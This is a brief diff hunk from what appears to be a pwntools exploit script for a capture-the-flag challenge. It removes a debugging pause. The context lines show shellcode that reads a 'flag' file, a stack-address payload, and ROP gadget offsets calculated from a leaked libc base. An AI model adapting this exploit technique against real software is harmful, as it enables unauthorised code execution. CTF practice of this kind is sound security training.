@@ -120,8 +120,6 @@ shellcode = shellcraft.amd64.linux.cat2('flag')
 secret(p64(0) + p64(gets) + p64(leak_stack - 0x110) + asm(shellcode))
 backdoor()
 
-raw_input()
-
 pop_rdi_ret = 0x000000000002164f + libc_base
 pop_rsi_ret = 0x0000000000023a6a + libc_base
 pop_rdx_ret = 0x0000000000001b96 + libc_base
